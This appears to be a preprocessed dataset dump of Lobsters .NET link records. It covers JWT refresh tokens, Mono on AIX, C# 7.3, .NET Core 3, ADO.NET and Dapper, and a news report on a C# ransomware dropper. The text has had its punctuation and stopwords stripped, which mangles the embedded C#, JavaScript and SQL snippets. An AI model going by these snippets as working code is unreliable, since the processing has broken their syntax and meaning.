example total time complete movementjob updaterottranstransform task went m m completion time see bottleneck shifted cpu gpu cost rendering tiny ship gpu outweighs cost tracking updating render command generation dispatch cpu side see screenshot got entity screen exact frame rate free burst compiler able perform arcane magic code execute function leveraging new tightly packed data layout latest architecture enhancement available modern cpu behind scene mentioned arcane magic actually take form autovectorization optimized scheduling better use instructionlevel parallelism reduce data dependency stall pipeline conclusion take day soak new concept pay dividend subsequent project power saved powerful gain reaped new system currency spent saved table optimization resulted significant improvement number object supported screen update cost classic c job system classic c job system entity component system burst c job system entity component system burst total frame time m frame m frame m frame m frame object screen movementjob time cost m frame m frame m frame m frame cpu rendering time cost draw ship m frame m frame job calculate rendering matrix m rendering command m frame m job calculate rendering matrix m rendering command m frame time gpu bound m frame m frame m frame m frame targeting mobile platform want significantly reduce battery consumption factor player retention take gain save making highend desktop experience catering pc master race use gain something special cutting edge simulation destruction tech make environment dynamic interactable immersive stand shoulder giant leverage revolutionary new tech something previously claimed impossible real time put asset store use thanks reading stay tuned sample space resource unity unity entity component system documentation unity entity component system sample unity entity component system forum unity documentation learning efficient memory layout ship asset used demo
264,Lobsters,dotnet,"C#, F#, .NET programming",Refresh Tokens in ASP.NET Core Web Api,https://www.blinkingcaret.com/2018/05/30/refresh-tokens-in-asp-net-core-web-api/,refresh token aspnet core web api,demo project create jwt access token secure web api aspnet core generate save retrieve revoke refresh token guids random exchange expired jwt refresh token new jwt token refresh token ie refresh jwt token set signing algorithm none use aspnet core authentication middleware authenticate user using jwt token signed secure web api aspnet core client,one thing come mind using access token secure web api token expires ask user credential really good option blog post using refresh token solve problem specifically aspnet core web apis jwt token first really big deal set long expiration date access token example month even year someone manages get hold token use month year even change password server trust token signature valid way invalidate change key used sign consequence invalidating everyone else token really option lead u idea using refresh token refresh token work imagine get access token also get another onetimeuse token refresh token app store refresh token leaf alone every time app sends request server sends access token authorization bearer tokengoeshere server know come time token expire server let know somehow happens app sends expired token refresh token get back new token refresh token rinse repeat something fishy happens refresh token revoked mean app try use get new access token request rejected user enter credential able log make last point clear imagine app store location eg dublin ireland request refresh token created user access information login place user recognize user revoke refresh token access token expires whoever using able continue use app probably good idea access token short lived ie valid couple minute use refresh token need able create access token use jwt generate save retrieve revoke refresh token serverside exchange expired jwt token refresh token new jwt token refresh token ie refresh jwt token use aspnet authentication middleware authenticate user jwt token way signal access token expired app optional token expires client transparently acquire new token need information topic individually continue want see working together find demo project create jwt access token want thorough description use jwt aspnet core recommend secure web api aspnet core summary first need add systemidentitymodeltokensjwt package dotnet add package systemidentitymodeltokensjwt create new jwt token private string generatetoken ienumerable claim claim var key new symmetricsecuritykey server key used sign jwt token use char var jwt new jwtsecuritytoken issuer blinkingcaret audience everyone claim claim user claim example new claim new claim claimtypesname username notbefore datetimeutcnow expires datetimeutcnowaddminutes signingcredentials new signingcredentials key return new jwtsecuritytokenhandler writetoken jwt method called writetoken return string creating new jwt token expiration date minute signed using generate save retrieve revoke refresh token refresh token must unique possible must hard guess might seem simple guid satisfies criterion unfortunately process generating guids random mean given guids easily guess next one thankfully secure random number generator aspnet core use generate string unique even given hard predict next one using systemsecuritycryptography public string generaterefreshtoken var randomnumber new byte using var rng randomnumbergeneratorcreate rnggetbytes randomnumber return randomnumber generating byte long random number converting use string guideline regarding length lead unique hard guess token picked even ok need generate refresh token first generate jwt token refresh expired token every time generate new refresh token save way linked user access token issued simplest version extra column refresh token user table consequence allowing user loggedin one location refresh token valid per user time alternatively maintain several refresh token per user save geographical location time etc request originated provide user activity report also probably good idea make refresh token expire example day save expiration date together refresh token one thing must forget remove refresh token used refresh operation used exchange expired jwt refresh token new jwt token refresh token ie refresh jwt token get new access token expired one need able access claim inside token even though token expired use aspnet core authentication middleware authenticating user using jwt return response expired token need create controller action allows anonymous user take jwt refresh token controller action need manually validate expired access token option ignore token lifetime extract information user contained use user information retrieve stored refresh token compare stored refresh token one sent request good create new jwt refresh token save new refresh token discard old send new jwt refresh token client retrieve user information form claimsprincipal expired jwt token private claimsprincipal getprincipalfromexpiredtoken string token var tokenvalidationparameters new tokenvalidationparameters validateaudience false might want validate audience issuer depending use case validateissuer false validateissuersigningkey true issuersigningkey new symmetricsecuritykey server key used sign jwt token use char validatelifetime false saying nt care token expiration date var tokenhandler new jwtsecuritytokenhandler securitytoken securitytoken var principal tokenhandlervalidatetoken token tokenvalidationparameters securitytoken var jwtsecuritytoken securitytoken jwtsecuritytoken jwtsecuritytoken null jwtsecuritytokenheaderalgequals stringcomparisoninvariantcultureignorecase throw new securitytokenexception invalid token return principal noteworthy part snippet using validatelifetime false tokenvalidationparameters expired token considered valid also checking algorithm used sign token one expect example reason theory someone could create jwt token set signing algorithm none jwt token would valid even unsigned way using valid refresh token would possible exchange fake token real jwt token need controller action post since side effect also token long query string parameter httppost public iactionresult refresh string token string refreshtoken var principal getprincipalfromexpiredtoken token var username principalidentityname var savedrefreshtoken getrefreshtoken username retrieve refresh token data store savedrefreshtoken refreshtoken throw new securitytokenexception invalid refresh token var newjwttoken generatetoken principalclaims var newrefreshtoken generaterefreshtoken deleterefreshtoken username refreshtoken saverefreshtoken username newrefreshtoken return new objectresult new token newjwttoken refreshtoken newrefreshtoken assumption snippet retrieving saving deleting omitted also assumption one refresh token per user simplest scenario use aspnet core authentication middleware authenticate user using jwt token need configure aspnet core middleware pipeline request come valid authorization bearer jwttoken header user signed want indepth discussion setup jwt particular aspnet core look secure web api aspnet core version aspnet core add single authentication middleware pipeline configure startupcs configureservices public void configureservices iservicecollection service servicesaddmvc servicesaddauthentication option optionsdefaultauthenticatescheme bearer optionsdefaultchallengescheme bearer addjwtbearer bearer option optionstokenvalidationparameters new tokenvalidationparameters validateaudience false validateissuer false validateissuersigningkey true issuersigningkey new symmetricsecuritykey server key used sign jwt token use char validatelifetime true clockskew timespanzero default setting minute optionsevents new jwtbearerevents onauthenticationfailed context contextexceptiongettype typeof securitytokenexpiredexception contextresponseheadersadd tokenexpired true return taskcompletedtask note snippet handling onauthenticationfailed event add tokenexpired header response request come expired token client use information decide use refresh token however client try use refresh token get response rely tokenexpired header response rest blog post need add authentication middleware pipeline public void configure iapplicationbuilder app ihostingenvironment env envisdevelopment appusedeveloperexceptionpage appuseauthentication client goal build api client realize token expired take appropriate action get new token transparently request fails expired access token new request sent refresh endpoint access refresh token request completes client get new token original request repeated implementation depend type client using describe possible javascript client relying response request expired token header named tokenexpired using fetch perform request web api async function fetchwithcredentials url option var jwttoken getjwttoken option option optionsheaders optionsheaders optionsheaders authorization bearer jwttoken var response await fetch url option responseok good return response return response responsestatus responseheadershas tokenexpired var refreshtoken getrefreshtoken var refreshresponse await refresh jwttoken refreshtoken refreshresponseok return response failed refresh return original response var jsonrefreshresponse await refreshresponsejson read json new token savejwttoken jsonrefreshresponsetoken saverefreshtoken jsonrefreshresponserefreshtoken return await fetchwithcredentials url option repeat original request else status andor tokenexpired header return response return original response snippet getjwttoken getrefreshtoken savejwttoken saverefreshtoken browser would use browser localstorage save retrieve token example function getjwttoken return localstoragegetitem token function getrefreshtoken return localstoragegetitem refreshtoken function savejwttoken token localstoragesetitem token token function saverefreshtoken refreshtoken localstoragesetitem refreshtoken refreshtoken also refresh function function performs post request api endpoint refreshing token example endpoint tokenrefresh async function refresh jwttoken refreshtoken return fetch tokenrefresh method post body token encodeuricomponent jwttoken refreshtoken encodeuricomponent getrefreshtoken header contenttype applicationxwwwformurlencoded using client would look like trying chrome developer tool console one thing note show red console happens request fails expired token seeing error error quote valid status code appropriate case something like avoid access token expiration date javascript refresh expires jwt token part separated second part contains user claim claim named exp contains unix time stamp token expires get javascript date object expiration date jwt token var claim jsonparse atob tokensplit var expirationdate new date claimsexp unix timestamp second javascript millisecond checking expiration date feel convoluted recommend also dealing timezones probably problem decided mention something interesting know make clear put jwt token secret tampered without making token invalid hope found post interesting drop line comment related
266,Lobsters,dotnet,"C#, F#, .NET programming",Introducing Mono on AIX and IBM i,http://www.mono-project.com/news/2018/05/29/mono-on-aix-and-ibm-i/,introducing mono aix ibm,mono release note ibm aix ibm take port mono mono support powerpc unix unix happened port needed change start naidne rtldmember undefined behaviour boring tl else next,note guest post calvin buckley nattynarwhal github introducing community port mono ibm aix ibm like help community port please contact maintainer gitter might noticed mono release note mono includes support ibm aix ibm two different yet mostly compatible operating system post serve introduction port take port mono porting mono new operating system hard might think pretty much entire world posix compliant day mono large yet manageable codebase due low number dependency use plain emphasis portability common processor architecture use supported code generator though obscure isas caveat pretty much work twiddling ifdefs accommodate target platform quirk missing different preprocessor definition function adding platform definition supported core functionality occasionally tweak runtime build system handle system something completely differently others case aix ibm thing background needed happen start giving background target platform target run powerpc processor big endian mode mono support powerpc bernhard urban maintains odd calling convention aix shared occasionally linux use function descriptor mean pointer function point code instead point metadata cause bug jit careful consume produce function descriptor instead raw pointer needed runtime better tested powerpc machine fast enough extra overhead significant always build runtime addition strange calling convention aix also different binary format mean currently aheadoftime compiler work unixlike operating system use elf aix extension ibm purpose port use xcoff subset window pe binary format aix unix descended system v rather bsd side family run powerpc system despite unix quirk describe article unix unix ibm formerly known decidedly unix unlike unix objectbased filesystem object mapped single humongous address space backed disk known single level storage real main storage ram hold page object use act cache object reside permanently disk instead flat file ibm us database table mean store data ibm file database table file one object type supported ibm others include library program program ibm simple native binary instead encapsulated object contain intermediate form called machine interface instruction similar msilcil translated optimized aheadoftime native hardware upon first use also provides part security model allowed user transition custom cisc cpu enhanced powerpc variant without recompile program original source code sound similar running inside webassembly rather kind unix port program dependent posix ibm provides environment called pase portable application solution environment provides binary compatibility aix executables large subset aix abi within ibm unix ibm totally different unix file perprocess address space ibm normally make incongruent system work try bridge gap ibm also integrated file system support bytestream file object true hierarchical file system directory hierarchy running unix program expect address space ibm provides something called teraspace provides large private address space per process job requires ibm completely change mmu mode cachetlb flush every time enters exit unix world making system call somewhat expensive particular forking io system call implemented enough port nontrivial aix program pase environment even quirk performance limitation could even build entirely inside pase environment port native ibm environment outputting mi code ahead time compiler considered would take lot work write mi backend jit use native apis runtime handle environment different anything else mono run instead pase aix ease porting existing posix compatible code happened port port came ibm user expressing interest wanting run net program system friend mine involved ibm community noticed working mostly complete fully working haiku port approached see could done considering experience porting mono new platform already powerpc jit decided take challenge primary porting target ibm aix support byproduct starting building ibm set chroot environment work chroot support added pase fairly recently setting toolchain aix package initial bringup port happened ibm point runtime built execution generated code happening one problem building ibm however performance limitation really start show building took amount time system access dual taking roughly minute build runtime aix due mostly computation configure script extremely impacted due emphasis many small read writes lot forking whereas took aix minute linux minute run configure script took ibm well hour run ouch point submitted initial branch pull request review lot back forth went work underlying bug well following proper style practice mono set aix vm machine switched crosscompiling aix ibm targeting platform source binary building ibm longer periodically copy binary ibm check mono using missing libc function system call tripped behaviour pase exhibit differently aix improved iteration time could start working actual porting work much quickly help matter unsure exactly aix worked david edelsohn ibm helped explaining aix handle thing like calling convention library issue gcc best practice dealing porting thing aix needed change unique aspect aix subset pase provides beyond usual ifdef handling start one annoyance poor gnu tool aix gnu binutils effectively useless aix explicitly use ibm binutils deal small problem related autotools environment variable assumption gnu ld feature makefiles also dealt issue older version gcc actually fairly well supported aix thing considered made upgrade newer version however gcc fixincludes tool try mend gcc compatibility issue system header file fact mangled causing missing definition found library sometimes libc never defined header first place improper use function pointer sometimes problem based advice bernhard problem function descriptor ifdefs caused mixup interpreting function pointer code fixed mono running generated code aix first time quite sight behold naidne one particularly nerveracking issue bugged trying bootstrap decimal type returning completely bogus value dividing causing nonsense overflow condition constant inlining occurred building bcl hard put careful debugging friend comparing variable state ppc dividing decimal determined exactly incorrect endianness handling taken place came fix mono historically handled different endianness fine mono started replace portion homegrown bcl corefx opensource microsoft bcl rigor towards endianness issue mono patch corefx code sometimes pull new code endianness possible compatibility issue worked yet thus requires patching case code already fixed big endian pulling updated code corefx created new problem endianness rtldmember aix two way handle library one typical system v style linking library used default forced way native way object stored archive typically used holding object used static linking aix always us positionindependent code multiple object combined single object inserted archive access library like normal using technique even fit multiple shared object version single archive took minimal change support adjust dynamic library loader tell look inside archive file build system tweak point proper archive object look annoyingly hardcode version name library object even build system still need revision case assumes library name name extension undefined behaviour mono try access object reference reference pointer null zero mono normally check see pointer null operating system process access invalid memory null pointer sends process signal sigsegv program handle signal terminate program normally mono register signal handler instead checking null would try dereference null pointer anyways let signal handler interrupt return exception managed code instead aix let program dereference null pointer anyway give accessing memory via null pointer actually defined ansi c standard case dreaded undefined behaviour mono relied assumption operating system typical way sending signal process aix instead implement null page mapped accepts read writes could also execute since zero invalid opcode powerpc much throw illegal instruction signal process historical decision relating back code optimization implemented older ibm compiler made used speculative execution compilergenerated code improved performance evaluating complex logical expression rely handling signal catch null dereference instead force behaviour always check pointer null normally reserved runtime debugging time boring tl boringssl required get modern tl required newer website build system instead autotools make cmake based luckily worked fine aix though apply massaging library mangling stumped illegal instruction error turned due linking pthread library warning turn even though boringssl working one cipher suite site using cipher broken try test gone yak shaving build needed test harness according readme ninja go heck time trying build go ppc linux system triage turned actually need anyway mono tweaked build system needed flip cmake flag let build test run manually figuring exactly wrong turned endianness issue optimized path fix attempted end disabling worked let cipher run fine big endian powerpc since code came google code rewritten boringssl openssl upstream latest source due replaced next time mono boringssl fork get updated else issue io getting spurious strange issue threading thread would complain unexpected errno indicating success happened aix assume program threadsafe default errno threadlocal one small define later fixed miguel de icaza amused operating system still consider thread safety advanced feature also found cosmetic issue uname unices put version release field uname structure thing like kernel type version field aix pase however put major version version field minor version release field simple sprintf aix case enough fix pase many quirk necessitated patch work around deficiency bug unimplemented function aim target ibm newer worked around bug fixed newer version lot cleaned preprocessor definition next mono run platform still lot work left done ahead time compiler need reworked emit xcoffcompatible code libgdiplus need ported roslyn broken continuous integration would useful detect build failure build system still bit weird regarding aix library plenty came despite fact port work well enough already current state provide solid foundation work going forward
267,Lobsters,dotnet,"C#, F#, .NET programming",New Features in C# 7.3,https://www.infoq.com/news/2018/05/CSharp-7.3,new feature c,improved overload candidate generic constraint unmanaged type constraint pointer type autoimplemented property fieldtargeted attribute support tuple type keyword proposal ref local variable c proposal,although comparatively minor release c address several long outstanding complaint c overload resolution since version c overload resolution rule rather questionable design circumstance would pick two method candidate though one could nt used depending priority incorrectly selected method compiler would either indicate method matched match ambiguous c move check happen overload resolution rather false match nt cause compiler error improved overload candidate proposal outline check method group contains instance static member discard instance member invoked without instance receiver context discard static member invoked instance receiver receiver include static member static context otherwise static instance member receiver ambiguously instance type due colorcolor situation include static context implicit instance receiver used includes body member defined static member well place used field initializers constructorinitializers method group contains generic method whose type argument satisfy constraint member removed candidate set method group conversion candidate method whose return type nt match delegate return type removed set generic constraint enum delegate unmanaged developer complaining inability indicate generic type must enum since generic introduced c finally addressed use enum keyword generic constraint likewise use keyword delegate generic constraint nt necessarily work way might expect constraint enum someone use foo systemenum probably meant use subclass systemenum nonetheless cover scenario enums delegate unmanaged type constraint proposal us unmanaged keyword indicate generic type must type reference type nt contain reference type field level nesting intended used low level interop code need create reusable routine across unmanaged type unmanaged type include primitive sbyte byte short ushort int uint long ulong char float double decimal bool intptr uintptr enum type pointer type user defined structs containing attribute hidden field autoimplemented property useful limitation apply attribute backing field ca nt see usually issue problematic dealing serialization autoimplemented property fieldtargeted attribute proposal address straightforward fashion applying attribute autoimplemented property simply prepend field modifier serializable public class foo field nonserialized public string mysecret get set tuple comparison name proposal support tuple type summarizes feature nicely detail edge case aware important potentially breaking change someone wrote valuetuple type implementation comparison operator would previously picked overload resolution since new tuple case come overload resolution would handle case tuple comparison instead relying userdefined comparison ideally custom valuetuple type would follow rule c compiler may subtle difference handle nested tuples dynamic type expression variable initializers way read like antifeature rather adding capability microsoft removed restriction expression variable used remove restriction preventing declaration expression variable variable declaration declaration pattern ctorinitializer declared variable scope throughout body constructor remove restriction preventing declaration expression variable variable declaration declaration pattern field property initializer declared variable scope throughout initializing expression remove restriction preventing declaration expression variable variable declaration declaration pattern query expression clause translated body lambda declared variable scope throughout expression query clause original reasoning restriction simply noted due lack time presumably restriction reduced amount testing needed done previous version c stack allocated array rarely used important feature c ability allocate array inside stack via stackalloc keyword may offer performance improvement normal array allocated heap cause gc pressure int block stackalloc int danger using stack allocated array since requires taking pointer stack used unsafe context clr attempt mitigate enabling buffer overrun detection cause application terminate quickly possible c gain ability initialize array created like would normal array proposal lack detail microsoft considering preinitializing master array could rapidly copied function invoked theory would faster creating array initializing element element note stack allocated array meant scenario need lot small briefly used array nt used large array deeply recursive function may exceed amount available stack space stack allocated span safe alternative stack allocated array stack allocated span eliminating pointer also eliminate possibility buffer overrun turn mean use without mark method unsafe span int block stackalloc int note span requires systemmemory nuget package reassignable ref local ref local variable reassigned like normal local variable c proposal see csharplang github site
268,Lobsters,dotnet,"C#, F#, .NET programming",Const Strings – a very convenient way to shoot yourself in the foot,https://www.stum.de/2009/01/14/const-strings-a-very-convenient-way-to-shoot-yourself-in-the-foot/,const string convenient way shoot foot,const string convenient way shoot foot const string reference something const string change development,const string convenient way shoot foot want static readonly string two option public static class mystringtestclass public static readonly string staticreadonly static readonly string public const string conststring const string difference subtle first staticreadonly like normal field get initialized static constructor conststring hardcoded look assembly reflector look like public static class mystringtestclass field public const string conststring const string public static readonly string staticreadonly method static mystringtestclass staticreadonly static readonly string obvious difference static readonly string initialized constructor also mean set dynamically construction const string really carved stone real difference subtle let create second assembly reference first one add class public class mystringtestconsumer public void testmethod string sro mystringtestclassstaticreadonly someotherfunction sro string sc mystringtestclassconststring someotherfunction sc public void someotherfunction string input dummy function prevent string sc optimized away compiler compile second assembly load reflector look testmethod public void testmethod string sro mystringtestclassstaticreadonly thissomeotherfunction sro string sc const string thissomeotherfunction sc see const string reference something static readonly string still reference field class resolved runtime const string actually copypasted compiler mean first mean theoretical performance increase lookup take place hence usually recommended fxcop one big caveat say multiple assembly one provides const one consumes happens change two string providerdll without touching consumerdll mystringtestclassstaticreadonly point new reference const string change literally inserted need recompile consumerdll string replaced new one bitten two providerdlls one test one live environment one consumerdll accidentally declared string const needle say deploying consumerdll live environment led interesting result yeah consts really useful sometimes static readonly field work better p think applies valuetypes like int well never shot foot int january development
269,Lobsters,dotnet,"C#, F#, .NET programming",The future of C#,https://channel9.msdn.com/Events/Build/2018/BRK2155,future c,code room,last year shipped le three point release c full small useful language feature mads dustin race tour turning big thing store future nullable reference type recursive pattern asynchronous stream code room wscc ballroom
270,Lobsters,dotnet,"C#, F#, .NET programming",.NET Core 3 and Support for Windows Desktop Applications,https://blogs.msdn.microsoft.com/dotnet/2018/05/07/net-core-3-and-support-for-windows-desktop-applications/,net core support window desktop application,net core support window desktop application microsoft build live benefit net core desktop performance improvement net framework net framework visualizing net core span sidebyside applocal deployment using net core existing desktop application paintnet updating project file control nuget package existing assembly reference next step closing asking feedback survey follow,net core support window desktop applicationsrichardat microsoft build live today sharing first look plan net core highlight net core support window desktop application specifically window form window presentation framework wpf uwp xaml able run new existing window desktop application net core enjoy benefit net core offerwe planning releasing first preview net core later year final version looking developer partner u give u feedback release version application timeframe release think net core one exciting net release ever releasedaspnet core continue move forward parallel release net core commitment web cloud application remains unchanged time time add window desktop application another supported workload net core heard many request desktop application net core sharing plan deliver let take look thatbenefits net core desktopthere many benefit net core great desktop apps worth calling explicitly performance improvement runtime update delight userssuper easy use test new version net core one app machineenables machineglobal applicationlocal deploymentsupport net core cli tool sdkstyle project visual studiowe also announcing set improvement adding net core net framework access full window aka winrt apiability host uwp xaml control wpf window form applicationsability host uwp browser medium control enabling modern browser medium content standard net framework also announcing plan net framework shipping net framework week ago expect next version ship month like past release new release include set targeted improvement including feature see listed abovevisualizing net core take look net core pictorial formsupport window desktop added set window desktop pack work window net core changing architecturally new version continue offer great crossplatform product focused cloud lot improvement planned scenario share laterfrom view think wpf rich layer directx window form thinner layer gdi plus wpf window form great job exposing exercising much desktop application functionality window c code window form wpf include set library net core window functionality like gdi plus directx remain windowswe also releasing new version net standard time naturally new net standard apis part net core yet added span example standard next versionc f vb already work net core able build desktop application three language net core applocal deploymentthe net core deployment model one biggest benefit window desktop developer experience net core short install net core pretty much way want come lot deployment flexibilitythe ability globally install net core provides much central installation servicing benefit net framework requiring inplace updateswhen new net core version released update one app machine time without concern affecting application new net core version installed new directory used existing applicationsfor case maximum isolation required deploy net core application working new build tool bundle app net core together single executable new optionwe request deployment option like many year never able deliver net framework much modular architecture used net core make flexible deployment option possibleusing net core existing desktop applicationfor new desktop application guide everyone start net core interesting question experience like move existing application particularly big one net core want experience straightforward enough moving net core easy choice application active development application getting much investment require much change stay net framework explanation plan desktop application need target net core recompileproject file need updated target net core need retarget recompile additional benefit update dependencieswe intend provide compatible apis desktop application plan make wpf window form sidebyside capable otherwise asis make work net core fact already done number apps others access towe version paintnet running lab fact access paintnet source code got existing paintnet binary working net core special build wpf available used wpf binary net framework directory lab machine aside exercise uncovered otherwise unknown bug threading net core fixed net core nice work paintnet done optimization yet found paintnet faster startup net core nice surprisesimilarly updated work net core provide simple path forward existing application using plan add major new feature ef core extended new feature remain recommended data stack type new application advise port ef core want take advantage new feature improved performancethere many design decision ahead early sign good know compatibility important everyone moving existing desktop application net core continue test application add functionality net core support post apis hard support get feedbackupdating project fileswith net core project adopted sdkstyle project one key aspect sdkstyle project packagereference newer way referencing nuget package packagereference replaces packagesconfig packagereference also make possible reference whole component area single assembly timethe biggest experience improvement sdkstyle project much smaller cleaner project filesmuch friendlier source control fewer change smaller diffs edit project file visual studio without unloadingnuget part build responsive change like target framework updatesupports multitargetingthe first part adopting net core desktop project migrating sdkstyle project migration experience visual studio available command linean example sdkstyle project aspnet core follows net core project file look similarcontrols nuget package existing assembly referencesdesktop application often many dependency maybe control vendor nuget binary source like updated net core quickly maybe even allas stated intend support dependency asis build conference see scott hunter demo net core desktop application us existing control continue testing scenario like validate net core compatibilitynext stepswe start following largely parallel test net framework desktop application net core determine prevents working easily often without access source codeenable easily anonymously share dependency data u collect broad aggregate data application basically crowd voting shape net core bepublish early design get early feedback youwe hope work u along way help u make net core great releaseclosingwe asking feedback survey recently thanks much filling response incredible resulting thousand response within first day last survey asked subset respondent skype feedback plan net core unknown build conference slide response positive based everything read heard believe net core feature set characteristic right tracktodays news demonstrates large investment commitment window desktop application expect two release u net core net framework number feature shared two release others available net core think commonality difference provide great set choice moving forward modernizing desktop applicationsit exciting time net developerprogram manager net team follow
272,Lobsters,dotnet,"C#, F#, .NET programming","The curious case of Freya, Suave and Giraffe: Reducing risks in picking a new tech",https://channel9.msdn.com/Events/FSharp-Events/fsharpConf-2018/03,curious case freya suave giraffe reducing risk picking new tech,,picking new technology hard often avoid change cost go devil know another extreme haphazard implementation hope best talk gien share strategy tried understand three web framework nt know beforehand freya suave giraffe order find good fit need along way gien discus trick everybody could use understand beyond specific library heuristic worked nt quickly evaluating library understanding risk
274,Lobsters,dotnet,"C#, F#, .NET programming",Suave v2.4.0 released (F# Web framework),https://github.com/SuaveIO/suave/releases/tag/2.4.0,suave released f web framework,suavetesting testingfs footnote,cleanup nonnet core cruft reducing maintenance burden move build fake upgrade logary facade gauge float liberal nuget constrains release drop suavexsp suavetesting way focusing project use making easier improve core using suavetesting copynpaste testingfs project instead footnote try release netcore get error systemdatacommon systemnetsecurity systemruntimeserializationjson systemsecurityclaims systemsecurityprincipal runtimenativesystemnetsecurity please file issue readd nuspec
275,Lobsters,dotnet,"C#, F#, .NET programming",New C# Ransomware Compiles itself at Runtime,https://www.bleepingcomputer.com/news/security/new-c-ransomware-compiles-itself-at-runtime/,new c ransomware compiles runtime,malwarehunterteam encrypted string function decrypts string csharpcodeprovider compiling source code encrypted folder decript fileshta ransom note,new indevelopment ransomware discovered interesting characteristic instead distributed executable performing ransomware functionality executables compiles embedded encrypted c program runtime launch directly memory discovered malwarehunterteam ransomware contains encrypted string embedded dropper shown encrypted string string decrypted using included decryption key function decrypts string source code ransomware executable decrypted decrypted code sent another function compiles using csharpcodeprovider class launch directly memory compiling source code method probably used prevent dropper detected security software malicious behavior hidden inside encrypted string ransomware saving decryption key iv file desktop fully functional therefore would nt surprising see ransomware distributed point executed encrypt file victim computer rename file using template sequre tutaio hex example file called would encrypted renamed sequre encrypted folder folder scanned ransom note named decript fileshta created provides payment instruction shown ransom note ransomware still development use interesting feature seen ransomware go show attacker continue try think new way bypass security program protect computer
276,Lobsters,dotnet,"C#, F#, .NET programming",ORM-less Data Access in .Net Core,https://www.blinkingcaret.com/2018/04/25/orm-less-data-access-in-net-core/,ormless data access net core,bobby table lazy loading even arguably good idea setting ef pain crud adonet net core connection postgresql idbconnection http wwwconnectionstringscom creating record command interpreted sql read video use sublime build query update deletes transaction isolation level using dapper dapper stackexchange stackoverflow superuser askubuntu github page project,use object relational mapper library orms prevalent today uncommon see anyone question use good reason old day see sql code sprinkled everywhere common find example user input concatenated directly sql statement opening door sql injection attack little bobby table come mind even though lot good came using orms le good thing came first performance worse sometimes much worse apart performance set issue although disadvantage negative impact experience using orm related fact orms hide lot detail data retrieved saved frequently people aware detail shoot foot example use lazy loading even arguably good idea eg web application problem stemming mechanism trigger data fetched thinking specifically entity framework obvious sometimes advocating orms used however perception nowadays people working net ecosystem able retrieve create record database without using entity framework unfortunate hard go raw might quicker setup entity framework following approach small project convinced put something faster without entity framework setting ef pain want blog post show use raw data access mechanism adonet available net core also alternative entity framework named dapper used stack overflow dapper sometimes described orm see object mapper crud adonet net core data access without entity framework core need master three concept concept connection command data reader connection object represents connection database use specific connection object database want interact example postgresql use npgsqlconnection mysql mysqlconnection sql server sqlconnection get idea connection type implement interface idbconnection need install right nuget package database want use example postgres package name simply npgsql easy way remember n net pgsql postgresql create connection object need connection string database want interact example database named example user johndoe postgres could create connection way var connection new npgsqlconnection user idjohndoe passwordthepassword hostlocalhost databaseexample great resource find information create connection string http wwwconnectionstringscom creating connection object actually connect database need call open connectionopen connection object idisposable dispose usually connection created inside using block using var connection new npgsqlconnection user idjohndoe passwordthepassword hostlocalhost databaseexample connectionopen use connection need start creating record create record need use command command container required perform operation database easiest way create command ask connection object one using var command connectioncreatecommand use command specify sql want execute property commandtext value parameter sql property parameter example want add record table named people column firstname lastname age would look like commandcommandtext insert people firstname lastname age value firstname lastname age commandparametersaddwithvalue firstname john commandparametersaddwithvalue lastname doe commandparametersaddwithvalue age use parameter prevents sql injection attack create sql using stringconcatenation using data entered user enable situation user type something interpreted sql way command executed depends result expect adding record case care autogenerated column value example new record id int numberofupdatedrows commandexecutenonquery method return number row updatedcreated although particularly useful insert statement update value might useful alternatively want insert get new record id change insert statement sql new id returned way depends database using example postgres sql would look like insert people firstname lastname age value firstname lastname age returning id sql server would look like insert people firstname lastname age value firstname lastname age select scopeidentity get run insert get new id use executescalaraspx method command executescalar method executes sql return value type object first column first row example postgres commandcommandtext insert people firstname lastname age value firstname lastname age returning id commandparametersaddwithvalue firstname jane commandparametersaddwithvalue lastname doe commandparametersaddwithvalue age var newid int commandexecutescalar might thinking right sql statement involve lot typing top intellisense thankfully technique around watch video paragraph creating insert statement scratch without actually manually type column name video read read data simply need write sql query call executereader method command object return instance datareader use retrieve actual result query example want retrieve record people table commandcommandtext select people datareader reader commandexecutereader way get actual value little bit clunky definitely comfortable entity framework showed video use sublime build query also use technique create code faster could iterate result assuming firstname lastname string age int commandcommandtext select people using datareader reader commandexecutereader readerread string firstname readergetstring readergetordinal firstname string lastname readergetstring readergetordinal lastname int age readergetordinal age something firstname lastname age getstring getboolean etc method expect number represents column index get column index calling readergetordinal columnname update deletes updating deleting record involves creating command right sql calling executenonquery command example wanted update record people table surname doe smith could commandcommandtext update people set lastnamesmith lastnamedoe int numberofaffectedrows commandexecutenonquery deletion similar example let delete record lastname commandcommandtext delete people lastname null int numberofaffectedrows commandexecutenonquery transaction one thing get free using orm like entity framework persist change ie callsavechanges happens inside transaction change persisted none thankfully creating transaction using adonet simple example add new person delete another update another yet inside db transaction using var transaction connectionbegintransaction var insertcommand connectioncreatecommand insertcommandcommandtext insert people firstname value firstname insertcommandparametersaddwithvalue firstname jane smith insertcommandexecutenonquery var deletecommand connectioncreatecommand deletecommandcommandtext delete people lastname null deletecommandexecutenonquery var updatecommand connectioncreatecommand updatecommandcommandtext update people set firstname x firstname updatecommandexecutenonquery transactioncommit easiest way create transaction request one connection object transaction created using isolationlevel although specify one particular database default used check list available isolation level choose one appropriate need transaction created operation end call commit transaction anything go wrong commit called change rolled back aside something useful know using adonet possible extract metadata database example column name type form particular table following snippet show get column name data type form column particular database table commandcommandtext select people using var reader commandexecutereader var columnschema readergetcolumnschema foreach var column columnschema consolewriteline columncolumnname columndatatypename using dapper alternatively using adonet using dapper easy small difference term performance case unfamiliar dapper project stackexchange power stackexchange familiy website stackoverflow superuser askubuntu etc use dapper need install nuget package conveniently named dapper along specific nuget package database targeting example postgres dotnet add package npgsql dotnet add package dapper dapper add extension method connection object namely query execute query allows run query map result type specify generic parameter example get record people table using dapper need get extension method connection object using var connection new npgsqlconnection theconnectionstring ienumerable people connectionquery select people query method always return ienumerable even expect one record example could insert new person get new id int newid connectionquery insert people firstname lastname age value firstname lastname age returning id new firstname john lastname doe age firstordefault example providing parameter query method first sql statement second one anonymous object property name match parameter sql statement also use instance class eg new person instead care result example want delete record use execute method instead return number record affected database example want delete record lastname null var numberofdeletedrecords connectionexecute delete person lastname null gentle introduction dapper github page project good resource interested learning hope blog post given enough information go ormless net core let know thought comment related
